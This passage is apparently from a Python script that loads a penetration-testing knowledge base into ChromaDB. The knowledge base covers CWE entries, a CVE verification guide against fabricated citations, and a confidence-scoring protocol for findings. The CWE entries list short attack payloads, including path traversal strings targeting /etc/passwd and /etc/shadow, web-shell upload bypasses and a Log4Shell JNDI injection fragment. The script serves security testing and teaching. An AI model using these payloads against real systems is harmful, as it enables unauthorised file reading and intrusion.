        ("CWE-22", "CWE-22: Path Traversal (Rank #8, 2023). User-controlled input used to access files outside intended directory. Payloads: ../../../etc/passwd, %2e%2e%2fetc%2fpasswd, ....//etc/passwd. Impact: read arbitrary files (config, /etc/shadow, source code, SSH keys). Tools: dotdotpwn, burpsuite. Mitigation: canonicalize paths, use chroot/jail, never concatenate user input to file paths."),
        ("CWE-352", "CWE-352: Cross-Site Request Forgery CSRF (Rank #9, 2023). Forces authenticated user to execute unwanted actions. Requires: user is logged in + no CSRF token. Payload: hidden form auto-submitting to target. Impact: password change, email change, fund transfer. Detection: check if sensitive actions lack CSRF tokens. Mitigation: CSRF tokens (synchronizer token pattern), SameSite cookie attribute, re-authentication for sensitive actions."),
        ("CWE-434", "CWE-434: Unrestricted Upload of Dangerous Files (Rank #10, 2023). File upload without type validation allows uploading web shells, malware. Attack: upload .php as image, access at /uploads/shell.php. Bypass techniques: double extension (shell.php.jpg), magic bytes, Content-Type manipulation. Mitigation: allowlist extensions, validate magic bytes, store uploads outside web root, rename files, use CDN for uploads."),
    ]
]

# ─── SOURCE 5: Anti-Hallucination Pentest Q&A Reference ──────────────────────

ANTI_HALLUCINATION_GUIDE = [
    {
        "id": "ah-cve-verification",
        "document": """Anti-Hallucination Protocol for CVE Citations
VERIFIED HIGH-IMPACT CVEs (NEVER INVENT OTHERS):
CVE-2021-44228 (Log4Shell): Log4j 2.0-2.14.1, CVSS 10.0, Remote Code Execution via JNDI injection ${jndi:ldap://...}
CVE-2022-22965 (Spring4Shell): Spring Framework < 5.3.18, CVSS 9.8, RCE via data binding
CVE-2021-41773: Apache 2.4.49, CVSS 9.8, Path traversal + RCE (requires mod_cgi)
CVE-2021-42013: Apache 2.4.49-2.4.50, CVSS 9.8, Path traversal bypass of 41773 fix
CVE-2017-0144 (EternalBlue): Windows SMBv1, CVSS 8.1, Remote Code Execution
CVE-2014-0160 (Heartbleed): OpenSSL 1.0.1-1.0.1f, CVSS 7.5, Memory disclosure
CVE-2022-0847 (DirtyPipe): Linux kernel 5.8-5.16.11, CVSS 7.8, Local PrivEsc
CVE-2021-4034 (PwnKit): polkit pkexec, CVSS 7.8, Local PrivEsc (all Linux)
CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2, CVSS 7.8, Local PrivEsc
CVE-2016-5195 (DirtyCow): Linux kernel < 4.8.3, CVSS 7.8, Local PrivEsc race condition
CVE-2014-6271 (Shellshock): bash < 4.3, CVSS 9.8, RCE via environment variables
CVE-2017-5638 (Apache Struts): CVSS 10.0, RCE via Content-Type header

RULE: If you cannot confirm a CVE number from this list or from RAG context, say:
"I need to verify: service [name] version [X] — please check searchsploit or NVD for exact CVEs"
NEVER fabricate CVE-YYYY-NNNNN numbers.""",
        "metadata": {"source": "anti-hallucination", "type": "verification-guide", "phase": "all"}
    },
    {
        "id": "ah-confidence-scoring",
        "document": """Confidence Scoring Protocol for Pentest Assessments
CONFIDENCE LEVELS:
1.0 — Verified: Exploit executed, shell obtained, CVE reproduced
0.9 — High: Service version confirmed + matching CVE in database + public PoC exists
0.8 — Good: Service version confirmed + CVE match but PoC not verified
0.7 — Medium: Banner/version detected but not manually confirmed
0.6 — Low: Assumed version from response headers only
0.5 — Uncertain: Port open but no version info
< 0.5 — Guess: Do not report as vulnerability; gather more info

REPORTING PROTOCOL:
- confidence >= 0.8: Include as confirmed vulnerability
- 0.6 <= confidence < 0.8: Include as "potential vulnerability, requires verification"
- confidence < 0.6: Include as "informational, further investigation needed"

AVOID FALSE POSITIVES:
- Never report vuln based on nmap guess only
- Always run version detection: nmap -sV --version-intensity 9
- Cross-reference with at least 2 sources (NVD + ExploitDB, or NVD + Nuclei template)
- Manual verification preferred for all Critical/High findings""",
        "metadata": {"source": "anti-hallucination", "type": "confidence-scoring", "phase": "all"}
    },
]

def main():
    total = 0
    print("\n[*] Expanding ChromaDB with new pentest knowledge sources...")
    print("=" * 60)

    print("\n[1/5] PTES Standard...")
    total += add_collection_docs("ptes_standard", PTES_KNOWLEDGE)

    print("\n[2/5] OWASP Top 10 2021...")
    total += add_collection_docs("owasp_top10", OWASP_TOP10_2021)

    print("\n[3/5] Pentest Techniques Reference...")
    total += add_collection_docs("pentest_techniques", PENTEST_TECHNIQUES)

    print("\n[4/5] CWE Top 25...")
    total += add_collection_docs("cwe_top25", CWE_TOP25)

    print("\n[5/5] Anti-Hallucination Guide...")
    total += add_collection_docs("anti_hallucination", ANTI_HALLUCINATION_GUIDE)

    print(f"\n{'=' * 60}")
    print(f"[✓] RAG EXPANSION COMPLETE: +{total} new documents")
    print(f"[✓] New collections: ptes_standard, owasp_top10, pentest_techniques, cwe_top25, anti_hallucination")
    print(f"[*] Verifying all collections...")

    all_cols = client.list_collections()
    total_docs = sum(c.count() for c in all_cols)
    print(f"\nAll ChromaDB Collections:")
    for col in sorted(all_cols, key=lambda c: -c.count()):
        print(f"  {col.name:30s} {col.count():>6,} docs")
    print(f"\n  TOTAL: {total_docs:,} documents")


if __name__ == "__main__":
    main()
